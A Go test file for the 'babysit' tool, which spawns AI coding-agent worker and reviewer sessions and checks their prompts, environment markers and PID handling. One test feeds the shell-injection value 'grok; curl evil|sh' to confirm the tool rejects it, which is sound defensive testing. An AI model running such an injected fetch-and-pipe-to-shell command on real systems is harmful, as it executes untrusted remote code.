package cmd

import (
	"github.com/reallongnguyen/babysit/internal/agent"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

func spawnState(t *testing.T) *apState {
	t.Helper()
	t.Setenv("BABYSIT_SPAWNED", "")
	t.Setenv("BABYSIT_REVIEWER", "")
	t.Setenv("BABYSIT_BUILDER", "")
	t.Setenv("BABYSIT_AGENT", "")
	t.Setenv("GROK_AGENT", "")
	t.Setenv("GROK_SESSION_ID", "")
	t.Setenv("CLAUDE_CODE_SESSION_ID", "")
	t.Setenv("BABYSIT_STATE_DIR", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	return &apState{stateRoot: t.TempDir()}
}

func fakeWorker(t *testing.T, name string) (marker string) {
	t.Helper()
	dir := t.TempDir()
	marker = filepath.Join(dir, "marker")
	if err := os.Mkdir(marker, 0o755); err != nil {
		t.Fatal(err)
	}
	script := `#!/bin/sh
printf '%s\n' "$*" > "$MARKER/argv"
{
  printf 'BABYSIT_SPAWNED=%s\n' "$BABYSIT_SPAWNED"
  printf 'BABYSIT_REVIEWER=%s\n' "$BABYSIT_REVIEWER"
  printf 'BABYSIT_TICKET=%s\n' "$BABYSIT_TICKET"
  printf 'AGENT_ROLE=%s\n' "$AGENT_ROLE"
} > "$MARKER/env"
# Stay up until the test writes marker/stop, so already-running can see us.
while [ ! -f "$MARKER/stop" ]; do sleep 0.05; done
`
	if err := os.WriteFile(filepath.Join(dir, name), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir)
	t.Setenv("MARKER", marker)
	return marker
}

func TestGoalPromptMatchesSkillHandoff(t *testing.T) {
	got := goalPrompt(mustAgent(t, "claude"), "bs-ab123", "builder")
	for _, want := range []string{
		"/goal bs-ab123 is done: qa verdict PASS/FIXED persisted via bbs ticket set-verdict,",
		"review-pr verdict persisted, branch pushed, handoff note written — or a",
		"NEEDS_CONTEXT / BLOCKED status block printed verbatim.",
		"Work it: /bbs:autopilot builder bs-ab123",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("prompt missing %q\n%s", want, got)
		}
	}

	skill, err := os.ReadFile(filepath.Join("..", "..", ".claude", "skills", "autopilot", "SKILL.md"))
	if err != nil {
		t.Fatal(err)
	}
	body := string(skill)
	for _, want := range []string{
		"qa verdict PASS/FIXED persisted via bbs ticket set-verdict,",
		"review-pr verdict persisted, branch pushed, handoff note written — or a",
		"NEEDS_CONTEXT / BLOCKED status block printed verbatim.",
		"Work it: /bbs:autopilot <workflow> <ticket>",
		"--auto",
		"bbs autopilot spawn-goal",
		"--reviewer",
		"bbs autopilot spawn-review",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("SKILL.md missing %q", want)
		}
	}
}

func TestSpawnGoalPrintRendersTheWorkerCommand(t *testing.T) {
	fakeWorker(t, "claude")
	a := spawnState(t)
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "builder", printOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.PID != 0 {
		t.Fatalf("--print spawned pid %d", res.PID)
	}
	if !strings.Contains(res.Cmd, "claude --dangerously-skip-permissions '/goal bs-x1 is done:") {
		t.Errorf("cmd = %s", res.Cmd)
	}
	if !strings.Contains(res.Cmd, "Work it: /bbs:autopilot builder bs-x1") {
		t.Errorf("cmd missing Work it line: %s", res.Cmd)
	}
}

func TestSpawnGoalStartsADetachedWorkerOnTheGoalPrompt(t *testing.T) {
	marker := fakeWorker(t, "claude")
	a := spawnState(t)
	cwd := t.TempDir()
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "grower", dir: cwd})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.WriteFile(filepath.Join(marker, "stop"), []byte("1"), 0o644)
		if res.PID != 0 {
			if p, err := os.FindProcess(res.PID); err == nil {
				_ = p.Kill()
			}
		}
	})
	if res.PID == 0 || res.AlreadyRunning {
		t.Fatalf("expected a new pid, got %+v", res)
	}
	if res.Agent != "claude" || res.Workflow != "grower" {
		t.Errorf("agent/workflow = %s/%s", res.Agent, res.Workflow)
	}

	argv := waitFile(t, filepath.Join(marker, "argv"))
	if !strings.Contains(argv, "--dangerously-skip-permissions") {
		t.Errorf("worker missing yolo flag: %s", argv)
	}
	if !strings.Contains(argv, "/goal bs-x1 is done:") {
		t.Errorf("worker not started on /goal: %s", argv)
	}
	if !strings.Contains(argv, "Work it: /bbs:autopilot grower bs-x1") {
		t.Errorf("worker missing Work it: %s", argv)
	}

	env := waitFile(t, filepath.Join(marker, "env"))
	for _, want := range []string{"BABYSIT_SPAWNED=true", "BABYSIT_TICKET=bs-x1", "AGENT_ROLE=mayor"} {
		if !strings.Contains(env, want) {
			t.Errorf("env missing %s\n%s", want, env)
		}
	}

	pidBytes, err := os.ReadFile(filepath.Join(a.stateRoot, "tickets", "bs-x1", "goal.pid"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(string(pidBytes)) != strconv.Itoa(res.PID) {
		t.Errorf("pid file %q != %d", pidBytes, res.PID)
	}
}

func TestSpawnGoalIsIdempotentWhileTheWorkerLives(t *testing.T) {
	marker := fakeWorker(t, "claude")
	a := spawnState(t)
	first, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", dir: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.WriteFile(filepath.Join(marker, "stop"), []byte("1"), 0o644)
		if p, err := os.FindProcess(first.PID); err == nil {
			_ = p.Kill()
		}
	})
	waitFile(t, filepath.Join(marker, "argv"))

	second, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", dir: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	if !second.AlreadyRunning || second.PID != first.PID {
		t.Fatalf("want the live pid %d reused, got %+v", first.PID, second)
	}
}

func TestSpawnGoalRefusesWhenAlreadySpawned(t *testing.T) {
	t.Setenv("BABYSIT_SPAWNED", "true")
	a := &apState{stateRoot: t.TempDir()}
	_, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1"})
	if err == nil || !strings.Contains(err.Error(), "already inside a spawned session") {
		t.Fatalf("want a refuse, got %v", err)
	}
	if exitStatus(err) != 2 {
		t.Errorf("exit %d, want 2", exitStatus(err))
	}
}

func TestSpawnGoalNeedsATicket(t *testing.T) {
	a := spawnState(t)
	_, err := a.runSpawnGoal(spawnOpts{})
	if err == nil || !strings.Contains(err.Error(), "--ticket") {
		t.Fatalf("want a ticket error, got %v", err)
	}
}

func TestSpawnGoalReadsWorkflowFromCheckpoint(t *testing.T) {
	fakeWorker(t, "claude")
	a := spawnState(t)
	td := filepath.Join(a.stateRoot, "tickets", "bs-x1")
	if err := os.MkdirAll(td, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(td, "checkpoint.json"),
		[]byte(`{"workflow":"sweeper","step":"run","status":"in_progress"}`), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", printOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Workflow != "sweeper" {
		t.Errorf("workflow = %q, want sweeper from checkpoint", res.Workflow)
	}
}

func TestReviewPromptAsksToPersistThenSpawnGoal(t *testing.T) {
	a := spawnState(t)
	got := a.reviewPrompt(mustAgent(t, "claude"), "bs-ab123", "builder", "")
	for _, want := range []string{
		"Review the plan and prototype for bs-ab123",
		"plan.md",
		"prototype.html",
		"Coverage",
		"Prototype inspected",
		"bbs ticket set-review --skill plan",
		"Do not spawn-goal",
		"Do not invoke /bbs:autopilot",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("review prompt missing %q\n%s", want, got)
		}
	}
	if strings.Contains(got, "bbs autopilot spawn-goal") {
		t.Error("review-only prompt must not tell the reviewer to spawn-goal")
	}
}

func TestReviewPromptPinsTheBuilderOnGreenlight(t *testing.T) {
	a := spawnState(t)
	got := a.reviewPrompt(mustAgent(t, "claude"), "bs-ab123", "builder", "grok")
	if !strings.Contains(got, "bbs autopilot spawn-goal --ticket bs-ab123 --workflow builder --agent grok") {
		t.Errorf("greenlight missing --agent grok\n%s", got)
	}
}

func TestSpawnGoalUsesBuilderEnvWhenAgentFlagIsMissing(t *testing.T) {
	// The failure this exists for: Claude reviews, then runs bare
	// `bbs autopilot spawn-goal` and the worker default (claude) builds.
	fakeWorker(t, "grok")
	a := spawnState(t)
	t.Setenv("BABYSIT_BUILDER", "grok")
	dir := t.TempDir()
	trustDir(t, dir)
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "builder", dir: dir, printOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Agent != "grok" {
		t.Errorf("spawn-goal agent = %q, want grok from BABYSIT_BUILDER", res.Agent)
	}
	if !strings.Contains(res.Cmd, "grok --always-approve") {
		t.Errorf("expected grok /goal, got %s", res.Cmd)
	}
}

func TestSpawnReviewCommandPinsTheBuilderEnv(t *testing.T) {
	fakeWorker(t, "claude")
	a := spawnState(t)
	res, err := a.runSpawnReview(spawnOpts{
		ticket: "bs-x1", workflow: "builder", agentFlag: "claude",
		builder: "grok", printOnly: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Cmd, "BABYSIT_BUILDER=grok") {
		t.Errorf("reviewer command must export BABYSIT_BUILDER so spawn-goal stays on grok:\n%s", res.Cmd)
	}
}

func TestSpawnGoalUsesTheStartAgent(t *testing.T) {
	fakeWorker(t, "grok")
	a := spawnState(t)
	t.Setenv("GROK_SESSION_ID", "gk-1")
	dir := t.TempDir()
	trustDir(t, dir)
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "builder", dir: dir, printOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Agent != "grok" {
		t.Errorf("--auto on grok must spawn grok, got %q", res.Agent)
	}
}

func TestSpawnReviewRequiresTheNamedAgent(t *testing.T) {
	a := spawnState(t)
	_, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1"})
	if err == nil || !strings.Contains(err.Error(), "--agent") {
		t.Fatalf("want --agent required, got %v", err)
	}
}

func TestSpawnReviewUnknownAgentNamesTheKnownOnes(t *testing.T) {
	a := spawnState(t)
	_, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "gork"})
	if err == nil {
		t.Fatal("want an error for an unknown reviewer")
	}
	for _, want := range []string{"gork", "claude", "grok"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not mention %q", err, want)
		}
	}
}

func TestSpawnReviewPrintUsesTheNamedAgent(t *testing.T) {
	fakeWorker(t, "grok")
	a := spawnState(t)
	dir := t.TempDir()
	trustDir(t, dir)
	res, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "grok", dir: dir, printOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Agent != "grok" {
		t.Errorf("agent = %q, want grok (the --reviewer, not worker_agent)", res.Agent)
	}
	if !strings.Contains(res.Cmd, "grok --always-approve '") {
		t.Errorf("cmd = %s", res.Cmd)
	}
	if !strings.Contains(res.Cmd, "Review the plan and prototype for bs-x1") {
		t.Errorf("cmd is not a review prompt: %s", res.Cmd)
	}
	if strings.Contains(res.Cmd, "/goal bs-x1 is done:") {
		t.Error("review spawn used the /goal prompt")
	}
}

func TestSpawnReviewStartsTheNamedAgent(t *testing.T) {
	marker := fakeWorker(t, "grok")
	a := spawnState(t)
	cwd := t.TempDir()
	trustDir(t, cwd)
	res, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", workflow: "builder", agentFlag: "grok", dir: cwd})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.WriteFile(filepath.Join(marker, "stop"), []byte("1"), 0o644)
		if res.PID != 0 {
			if p, err := os.FindProcess(res.PID); err == nil {
				_ = p.Kill()
			}
		}
	})
	if res.PID == 0 || res.AlreadyRunning {
		t.Fatalf("expected a new pid, got %+v", res)
	}
	if res.Agent != "grok" {
		t.Errorf("agent = %q", res.Agent)
	}

	argv := waitFile(t, filepath.Join(marker, "argv"))
	if !strings.Contains(argv, "--always-approve") {
		t.Errorf("reviewer missing yolo flag: %s", argv)
	}
	if !strings.Contains(argv, "Review the plan and prototype for bs-x1") {
		t.Errorf("reviewer not started on the review prompt: %s", argv)
	}

	env := waitFile(t, filepath.Join(marker, "env"))
	for _, want := range []string{"BABYSIT_REVIEWER=true", "BABYSIT_TICKET=bs-x1", "AGENT_ROLE=mayor"} {
		if !strings.Contains(env, want) {
			t.Errorf("env missing %s\n%s", want, env)
		}
	}
	if strings.Contains(env, "BABYSIT_SPAWNED=true") {
		t.Errorf("reviewer must not set BABYSIT_SPAWNED (it has to spawn-goal on approve)\n%s", env)
	}

	pidPath := filepath.Join(a.stateRoot, "tickets", "bs-x1", "review.pid")
	pidBytes, err := os.ReadFile(pidPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(string(pidBytes)) != strconv.Itoa(res.PID) {
		t.Errorf("pid file %q != %d", pidBytes, res.PID)
	}
}

func TestSpawnReviewOpensAnOrcaTerminal(t *testing.T) {
	a := spawnState(t)
	log, _ := fakeOrcaFor(t)
	cwd := t.TempDir()
	res, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", workflow: "builder", agentFlag: "claude", dir: cwd})
	if err != nil {
		t.Fatal(err)
	}
	if res.Orca != "bbs review bs-x1" {
		t.Errorf("ORCA = %q", res.Orca)
	}
	if res.PID != 0 {
		t.Errorf("orca spawn should not detach a pid, got %d", res.PID)
	}
	calls := readFile(log)
	if !strings.Contains(calls, "terminal create") {
		t.Errorf("orca was not asked to create a terminal:\n%s", calls)
	}
	if !strings.Contains(calls, "--title bbs review bs-x1") {
		t.Errorf("missing title:\n%s", calls)
	}
	if !strings.Contains(calls, "claude --dangerously-skip-permissions") {
		t.Errorf("orca command missing the reviewer CLI:\n%s", calls)
	}
	if !strings.Contains(calls, "Review the plan and prototype for bs-x1") {
		t.Errorf("orca command missing the review prompt:\n%s", calls)
	}
}

func TestSpawnGoalOnGrokOpensAnOrcaGoalTerminal(t *testing.T) {
	a := spawnState(t)
	t.Setenv("GROK_SESSION_ID", "gk-1")
	log, _ := fakeOrcaFor(t)
	cwd := t.TempDir()
	trustDir(t, cwd)
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "builder", dir: cwd})
	if err != nil {
		t.Fatal(err)
	}
	if res.Agent != "grok" || res.Orca != "bbs goal bs-x1" {
		t.Errorf("--auto on grok = agent %q orca %q", res.Agent, res.Orca)
	}
	calls := readFile(log)
	if !strings.Contains(calls, "--title bbs goal bs-x1") {
		t.Errorf("missing goal tab:\n%s", calls)
	}
	if !strings.Contains(calls, "grok --always-approve") {
		t.Errorf("goal tab must be grok:\n%s", calls)
	}
}

func TestSpawnReviewOrcaReusesALiveTab(t *testing.T) {
	a := spawnState(t)
	_, _ = fakeOrcaFor(t, "bbs review bs-x1")
	res, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "claude", dir: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	if !res.AlreadyRunning || res.Orca != "bbs review bs-x1" {
		t.Fatalf("want the live orca tab reused, got %+v", res)
	}
}

func TestSpawnReviewOrcaReusesARetitledTab(t *testing.T) {
	a := spawnState(t)
	_, _ = fakeOrcaFor(t, "◐ bs-x1 plan and prototype review")
	res, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "claude", dir: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	if !res.AlreadyRunning || !strings.Contains(res.Orca, "bs-x1") {
		t.Fatalf("want the retitled orca tab reused, got %+v", res)
	}
}

func TestSpawnReviewRefusesWhenAlreadyAReviewer(t *testing.T) {
	t.Setenv("BABYSIT_REVIEWER", "true")
	a := &apState{stateRoot: t.TempDir()}
	_, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "claude"})
	if err == nil || !strings.Contains(err.Error(), "already inside a reviewer session") {
		t.Fatalf("want a refuse, got %v", err)
	}
}

func TestSpawnGoalStillWorksFromAReviewerSession(t *testing.T) {
	// The greenlight: reviewer approves and calls spawn-goal. BABYSIT_REVIEWER
	// must not trip the goal refuse (only BABYSIT_SPAWNED does).
	fakeWorker(t, "claude")
	t.Setenv("BABYSIT_REVIEWER", "true")
	t.Setenv("BABYSIT_SPAWNED", "")
	a := spawnState(t)
	t.Setenv("BABYSIT_REVIEWER", "true")
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", printOnly: true})
	if err != nil {
		t.Fatalf("reviewer must be allowed to spawn-goal, got %v", err)
	}
	if !strings.Contains(res.Cmd, "/goal bs-x1 is done:") {
		t.Errorf("expected the /goal prompt, got %s", res.Cmd)
	}
}

func TestSpawnReviewRefusesFromAGoalSession(t *testing.T) {
	t.Setenv("BABYSIT_SPAWNED", "true")
	a := &apState{stateRoot: t.TempDir()}
	_, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "claude"})
	if err == nil || !strings.Contains(err.Error(), "already inside a spawned session") {
		t.Fatalf("want a refuse, got %v", err)
	}
}

func waitFile(t *testing.T, path string) string {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		b, err := os.ReadFile(path)
		if err == nil && len(b) > 0 {
			return string(b)
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for %s", path)
	return ""
}

// --builder reaches the builder only as text interpolated into the reviewer's
// greenlight line and into the shell string Orca runs, so an unchecked value
// fails hours later in a log nobody reads — or reaches a shell.
func TestSpawnReviewRejectsAnUnknownBuilder(t *testing.T) {
	a := spawnState(t)
	_, err := a.runSpawnReview(spawnOpts{ticket: "bs-x1", agentFlag: "claude", builder: "grokk"})
	if err == nil || !strings.Contains(err.Error(), "--builder") {
		t.Fatalf("want a --builder error, got %v", err)
	}
	if exitStatus(err) != 2 {
		t.Errorf("exit %d, want 2", exitStatus(err))
	}
}

func TestSpawnReviewRejectsAShellInjectingBuilder(t *testing.T) {
	a := spawnState(t)
	_, err := a.runSpawnReview(spawnOpts{
		ticket: "bs-x1", agentFlag: "claude", builder: "grok; curl evil|sh",
	})
	if err == nil {
		t.Fatal("a builder with shell metacharacters must not reach the orca command")
	}
}

// agent.go documents BABYSIT_AGENT as the "this run means it" override. The
// ambient session stands in for an unset preference, so it must not outrank it.
func TestSpawnGoalLetsBabysitAgentOutrankTheStartAgent(t *testing.T) {
	fakeWorker(t, "grok")
	a := spawnState(t)
	t.Setenv("CLAUDE_CODE_SESSION_ID", "cc-1")
	t.Setenv("BABYSIT_AGENT", "grok")
	dir := t.TempDir()
	trustDir(t, dir)
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "builder", dir: dir, printOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Agent != "grok" {
		t.Errorf("agent = %q, want grok from BABYSIT_AGENT", res.Agent)
	}
}

// The greenlight runs inside the reviewer, whose environment the builder
// inherits. A builder that still looks like a reviewer trips refuseSpawn.
func TestSpawnGoalClearsTheReviewerMarkerForTheBuilder(t *testing.T) {
	marker := fakeWorker(t, "claude")
	a := spawnState(t)
	t.Setenv("BABYSIT_REVIEWER", "true")
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", dir: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.WriteFile(filepath.Join(marker, "stop"), []byte("1"), 0o644)
		if res.PID != 0 {
			if p, err := os.FindProcess(res.PID); err == nil {
				_ = p.Kill()
			}
		}
	})
	env := waitFile(t, filepath.Join(marker, "env"))
	if !strings.Contains(env, "BABYSIT_REVIEWER=\n") {
		t.Errorf("builder inherited the reviewer marker:\n%s", env)
	}
}

// A worker started while Orca was down is still alive when Orca comes up.
// Creating a tab for it would put two agents on one worktree.
func TestSpawnGoalHonoursTheLivePIDEvenWhenOrcaIsUp(t *testing.T) {
	a := spawnState(t)
	log, _ := fakeOrcaFor(t)
	td := filepath.Join(a.stateRoot, "tickets", "bs-x1")
	if err := os.MkdirAll(td, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(td, "goal.pid"),
		[]byte(strconv.Itoa(os.Getpid())+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cwd := t.TempDir()
	trustDir(t, cwd)
	res, err := a.runSpawnGoal(spawnOpts{ticket: "bs-x1", workflow: "builder", dir: cwd})
	if err != nil {
		t.Fatal(err)
	}
	if !res.AlreadyRunning || res.PID != os.Getpid() {
		t.Fatalf("want the live pid honoured, got %+v", res)
	}
	if strings.Contains(readFile(log), "terminal create") {
		t.Errorf("a second worker was created alongside the live one:\n%s", readFile(log))
	}
}

// mustAgent is the profile a prompt test renders against. The prompts now vary
// by agent (skill prefix), so a test asserting `/bbs:autopilot` has to say
// which agent it means.
func mustAgent(t *testing.T, name string) agent.Profile {
	t.Helper()
	p, err := agent.ByName(name)
	if err != nil {
		t.Fatal(err)
	}
	return p
}
